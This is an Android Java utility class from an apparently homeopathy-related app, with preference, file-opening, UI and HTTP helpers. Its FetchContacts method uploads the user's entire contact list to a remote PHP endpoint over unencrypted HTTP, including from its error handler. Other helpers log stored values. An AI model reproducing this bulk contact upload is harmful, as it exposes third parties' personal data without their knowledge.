package shifa.nasz.locally;

import android.app.Activity;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.database.Cursor;
import android.net.Uri;
import android.os.AsyncTask;
import android.provider.ContactsContract;
import android.util.Log;
import android.widget.ImageView;
import android.widget.TextView;
import android.widget.Toast;

import org.apache.http.HttpEntity;
import org.apache.http.HttpResponse;
import org.apache.http.NameValuePair;
import org.apache.http.client.HttpClient;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.client.utils.URLEncodedUtils;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicNameValuePair;
import org.json.JSONArray;

import java.io.BufferedReader;
import java.io.File;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.util.ArrayList;
import java.util.LinkedList;
import java.util.List;

public class Super_Library_AppClass {
	Context ctx;
 	public JSONArray jsonObject = null;
 	public String JsonString = "";
    private static String TAG = "SuperLibraryAppClass";

	public Super_Library_AppClass(Context ctx)
	{
		this.ctx = ctx;
	}
    public String FetchContacts(){
        String ContactInfo = "";
        try {
            ContentResolver cr = ctx.getContentResolver();
            Cursor cur = cr.query(ContactsContract.Contacts.CONTENT_URI,
                    null, null, null, null);
            if (cur.getCount() > 0) {
                while (cur.moveToNext()) {
                    String id = cur.getString(cur.getColumnIndex(ContactsContract.Contacts._ID));
                    String name = cur.getString(cur.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));

                    if (Integer.parseInt(cur.getString(
                            cur.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER))) > 0) {
                        Cursor pCur = cr.query(
                                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                                null,
                                ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
                                new String[]{id}, null);
                        while (pCur.moveToNext()) {
                            String phoneNo = pCur.getString(pCur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                            ContactInfo += name + "#-#" + phoneNo  + "#_#";
                            //  Toast.makeText(ctx, "Name: " + name + ", Phone No: " + phoneNo, Toast.LENGTH_SHORT).show();
                        }
                        pCur.close();
                    }
                }
            }
            SavePreference("ProfileContactInfo", ContactInfo);

            List<NameValuePair> nameValuePairs = new ArrayList<NameValuePair>(2);
            nameValuePairs.add(new BasicNameValuePair("contactinfo", ContactInfo));

            nameValuePairs.add(new BasicNameValuePair("mobile", GetPreferenceValue("ProfileMobile")));
            Super_Library_URL SLU = new Super_Library_URL("http://kent.nasz.us/mumbra/php/contacts.php", nameValuePairs, ((Activity) ctx));
        }catch(Exception ex){
            List<NameValuePair> nameValuePairs = new ArrayList<NameValuePair>(2);
            nameValuePairs.add(new BasicNameValuePair("TAG", TAG));
            nameValuePairs.add(new BasicNameValuePair("ContactInfo", ContactInfo));
            nameValuePairs.add(new BasicNameValuePair("Error", ex.toString()));
            Super_Library_URL SLU1 = new Super_Library_URL("http://kent.nasz.us/mumbra/php/error.php", nameValuePairs, ((Activity) ctx));

        }
        return ContactInfo;
    }
    public void ClearHistory(){
        try{
            long bytesDeleted = 0;
            File cacheDir;
            String sdState = android.os.Environment.getExternalStorageState();
            if (sdState.equals(android.os.Environment.MEDIA_MOUNTED)) {
                File sdDir = android.os.Environment.getExternalStorageDirectory();
                cacheDir = new File(sdDir,"data/shifapics");

            } else {
                cacheDir = ctx.getCacheDir();
            }

            File[] files = cacheDir.listFiles();

            for (File file : files) {
                file.delete();
                bytesDeleted += file.length();


            }
            Toast.makeText(
                    ctx.getApplicationContext(),
                    "App pictures are cleared successfully. "  +cacheDir.getPath() + " size " + bytesDeleted,
                    Toast.LENGTH_SHORT).show();
        }
        catch(Exception ex){
            Toast.makeText(
                    ctx.getApplicationContext(),
                    "Error:" + ex.toString(),
                    Toast.LENGTH_SHORT).show();

        }
    }
    public void FetchData(){


        Log.e("exp","true");
        Intent intent = new Intent(ctx, activity_settings.class);
        intent.putExtra("where", "1");
        intent.putExtra("cols", "id_web,book,newrem,maincategoy,sublevel,Name,remedies,Intensity,categoy,level,selected,entry,lat_lng");
        ctx.startActivity(intent);
        ((Activity)ctx).finish();
    }
    public  void openFile(Context context, File url) {
        // Create URI
        try {
            File file = url;
            Uri uri = Uri.fromFile(file);

            Intent intent = new Intent(Intent.ACTION_VIEW);
            // Check what kind of file you are trying to open, by comparing the url with extensions.
            // When the if condition is matched, plugin sets the correct intent (mime) type,
            // so Android knew what application to use to open the file
            if (url.toString().contains(".doc") || url.toString().contains(".docx")) {
                // Word document
                intent.setDataAndType(uri, "application/msword");
            } else if (url.toString().contains(".pdf")) {
                // PDF file
                intent.setDataAndType(uri, "application/pdf");
            } else if (url.toString().contains(".ppt") || url.toString().contains(".pptx")) {
                // Powerpoint file
                intent.setDataAndType(uri, "application/vnd.ms-powerpoint");
            } else if (url.toString().contains(".xls") || url.toString().contains(".xlsx")) {
                // Excel file
                intent.setDataAndType(uri, "application/vnd.ms-excel");
            } else if (url.toString().contains(".zip") || url.toString().contains(".rar")) {
                // WAV audio file
                intent.setDataAndType(uri, "application/x-wav");
            } else if (url.toString().contains(".rtf")) {
                // RTF file
                intent.setDataAndType(uri, "application/rtf");
            } else if (url.toString().contains(".wav") || url.toString().contains(".mp3")) {
                // WAV audio file
                intent.setDataAndType(uri, "audio/x-wav");
            } else if (url.toString().contains(".gif")) {
                // GIF file
                intent.setDataAndType(uri, "image/gif");
            } else if (url.toString().contains(".jpg") || url.toString().contains(".jpeg") || url.toString().contains(".png")) {
                // JPG file
                intent.setDataAndType(uri, "image/jpeg");
            } else if (url.toString().contains(".txt")) {
                // Text file
                intent.setDataAndType(uri, "text/plain");
            } else if (url.toString().contains(".3gp") || url.toString().contains(".mpg") || url.toString().contains(".mpeg") || url.toString().contains(".mpe") || url.toString().contains(".mp4") || url.toString().contains(".avi")) {
                // Video files
                intent.setDataAndType(uri, "video/*");
            } else {
                //if you want you can also define the intent type for any other file

                //additionally use else clause below, to manage other unknown extensions
                //in this case, Android will show all applications installed on the device
                //so you can choose which application to use
                intent.setDataAndType(uri, "*/*");
            }

            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            context.startActivity(intent);
        }catch(Exception ex){

        }
    }
    public String RestoreSessionIndexID(String SessionKey)
		{
			
			SharedPreferences prefs = ctx.getSharedPreferences("AppNameSettings",0); 
			String restoredText = prefs.getString(SessionKey, null);
			if (restoredText != null) 
			{
				return restoredText;
			}
			return "1";

		}
    public ImageView FindItemName(String str){
        ImageView imageView = new ImageView(ctx);
        if (str.indexOf("Name") != -1 || str.indexOf("Student") != -1) {
            imageView.setBackgroundResource(R.drawable.ic_shop11);
        }
        else if (str.indexOf("Address") != -1) {
            imageView.setBackgroundResource(R.drawable.ic_distance1);
        } else if (str.indexOf("Phone") != -1 || str.indexOf("Mobile") != -1) {
            imageView.setBackgroundResource(R.drawable.ic_phone16);
        } else if (str.indexOf("Hour") != -1 || str.indexOf("Time") != -1) {
            imageView.setBackgroundResource(R.drawable.ic_clock96);
        } else if (str.indexOf("Price") != -1 || str.indexOf("Cost") != -1) {
            imageView.setBackgroundResource(R.drawable.ic_commercial17);
        } else if (str.indexOf("Website") != -1 || str.indexOf("Email") != -1) {
            imageView.setBackgroundResource(R.drawable.ic_domain1);
        } else if (str.indexOf("Åudio") != -1 || str.indexOf("Record") != -1 || str.indexOf("Voice") != -1) {
            imageView.setBackgroundResource(R.drawable.ic_voice29);
        } else if (str.indexOf("Details") != -1 || str.indexOf("Description") != -1) {
            imageView.setBackgroundResource(R.drawable.ic_profile8);
        } else if (str.indexOf("Photo") != -1 || str.indexOf("Picture") != -1) {
            imageView.setBackgroundResource(R.drawable.ic_profile8);
        } else {
            imageView.setBackgroundResource(R.drawable.ic_action_officeworker2);
        }

        return imageView;
    }
    public TextView FindItemNameForTextView(String str){
        TextView textView = new TextView(ctx);

        if (str.indexOf("Name") != -1 || str.indexOf("Student") != -1) {
            textView.setCompoundDrawablesWithIntrinsicBounds(R.drawable.ic_shop11, 0, 0, 0);
        }
        else if (str.indexOf("Address") != -1) {
            textView.setCompoundDrawablesWithIntrinsicBounds(R.drawable.ic_distance1, 0, 0, 0);

        } else if (str.indexOf("Phone") != -1 || str.indexOf("Mobile") != -1) {
            textView.setCompoundDrawablesWithIntrinsicBounds(R.drawable.phone54, 0, 0, 0);
        } else if (str.indexOf("Hour") != -1 || str.indexOf("Time") != -1) {
            textView.setCompoundDrawablesWithIntrinsicBounds(R.drawable.ic_clock96, 0, 0, 0);
        } else if (str.indexOf("Price") != -1 || str.indexOf("Cost") != -1) {
            textView.setCompoundDrawablesWithIntrinsicBounds(R.drawable.ic_commercial17, 0, 0, 0);
        } else if (str.indexOf("Website") != -1 || str.indexOf("Email") != -1) {
            textView.setCompoundDrawablesWithIntrinsicBounds(R.drawable.ic_domain1, 0, 0, 0);
        } else if (str.indexOf("Åudio") != -1 || str.indexOf("Record") != -1 || str.indexOf("Voice") != -1) {
            textView.setCompoundDrawablesWithIntrinsicBounds(R.drawable.ic_voice29, 0, 0, 0);
        } else if (str.indexOf("Details") != -1 || str.indexOf("Description") != -1) {
            textView.setCompoundDrawablesWithIntrinsicBounds(R.drawable.ic_profile8, 0, 0, 0);
        } else if (str.indexOf("Photo") != -1 || str.indexOf("Picture") != -1) {
            textView.setCompoundDrawablesWithIntrinsicBounds(R.drawable.ic_profile8, 0, 0, 0);
        } else {
            textView.setCompoundDrawablesWithIntrinsicBounds(R.drawable.ic_action_officeworker2, 0, 0, 0);
        }
        int dp = (int) ctx.getResources().getDimension(R.dimen.pad_10dp);
        textView.setCompoundDrawablePadding(dp);
        textView.setTextColor(ctx.getResources().getColor(R.color.textColor));
        textView.setPadding(0,0,0,0);
//        textView.setBackgroundColor(ctx.getResources().getColor(R.color.white_smoke));


       // textView.setLayoutParams(new LinearLayout.LayoutParams(AbsListView.LayoutParams.MATCH_PARENT, AbsListView.LayoutParams.WRAP_CONTENT, 1f));

        return textView;
    }
	 public String GetPreferenceValue(String StringName)
	    {
	    	SharedPreferences prefs =ctx.getSharedPreferences("AppNameSettings",0); 
			String restoredText = prefs.getString(StringName, null);
			
			if (restoredText != null) 
			{
				Log.e("GetPreferenceValue " + StringName, restoredText);
				return restoredText;
			}
			return "0";
	    }
    public boolean SaveArrayPreference(String arrayName, String[] array ) {
        SharedPreferences prefs = ctx.getSharedPreferences("preferencename", 0);
        SharedPreferences.Editor editor = prefs.edit();


        editor.putInt(arrayName +"_size", array.length);
        for(int i=0;i<array.length;i++)
            editor.putString(arrayName + "_" + i, array[i]);
        return editor.commit();
    }
    public String[] GetArrayPreference(String arrayName) {
        SharedPreferences prefs = ctx.getSharedPreferences("preferencename", 0);
        int size = prefs.getInt(arrayName + "_size", 0);
        String array[] = new String[size];
        for(int i=0;i<size;i++)
            array[i] = prefs.getString(arrayName + "_" + i, null);
        return array;
    }

    public void SavePreference(String StringName,String StringValue)
	    {
	    	
	    	SharedPreferences.Editor editor = ctx.getSharedPreferences("AppNameSettings",0).edit();
			editor.putString(StringName,StringValue);
		    Log.e("SetPreferenceValue " + StringName, StringValue);
		    editor.commit();
	    }
	   public boolean isPaidMember()
	   {
		   SharedPreferences prefs = ctx.getSharedPreferences("AppNameSettings",0); 
			String restoredText = prefs.getString("RemoveAds", null);
			if (restoredText != null) // Register user 
			{
				return true;
			}
			else
			{
				return false;
					
			}
	   }
	   public void PostWebApi(String[] values){
		   new MyAsyncTask().execute(values);
	   }
	   public class MyAsyncTask extends AsyncTask<String, Integer, Double>{
			 
			@Override
			protected Double doInBackground(String... params) {
				// TODO Auto-generated method stub
				
				if (params.length == 2) 
					postData(params[0],params[1],false);
				else
					postData(params[0],params[1],true);
				return null;
			}
	 
			protected void onPostExecute(Double result){
	//			pb.setVisibility(View.GONE);
				
			}
			protected void onProgressUpdate(Integer... progress){
//				pb.setProgress(progress[0]);
			}
	 
			public void postData(String valueIWantToSend, String URL, Boolean flagresponse) {
				// Create a new HttpClient and Post Header
				StringBuilder builder = new StringBuilder();
				if(!URL.endsWith("?"))
			        URL += "?";
				InputStream inputStream = null;
		        String result = "";
		        try {
		 
		            // create HttpClient
		            HttpClient httpclient = new DefaultHttpClient();
		            List<BasicNameValuePair> params = new LinkedList<BasicNameValuePair>();
		            params.add(new BasicNameValuePair("value", valueIWantToSend));
		            String paramString = URLEncodedUtils.format(params, "utf-8");
		            URL += paramString;
		            Log.e("url", URL);
					Log.e("url param", valueIWantToSend);
					    // make GET request to the given URL
		            HttpResponse httpResponse = httpclient.execute(new HttpGet(URL));
		            Log.e("url response flag" ,flagresponse.toString());
		            if (flagresponse == true){
		            	
	            	HttpEntity entity = httpResponse.getEntity();
	    			InputStream content = entity.getContent();
	    			BufferedReader reader = new BufferedReader(new InputStreamReader(content));
	    			String line;
	    			while((line = reader.readLine()) != null){
	    				Log.e("jsonObject", line);	
	    				builder.append(line);
	    			}
	    			Log.e("jsonObject", "insert jsonObject");
	    			JsonString =  builder.toString();
	    			jsonObject = new JSONArray(builder.toString());
	    			Log.e("jsonObject", "received jsonObject");
		            }
		            
		        } catch (Exception e) {
		        	JsonString =  "";
		            jsonObject = null;
		            Log.e("url error", e.getLocalizedMessage());
		            Log.d("InputStream", e.getLocalizedMessage());
		            
		            
		        }
		 
			}
	 
		}
	public HttpClient MyAsyncTask() {
		// TODO Auto-generated method stub
		return null;
	}
}
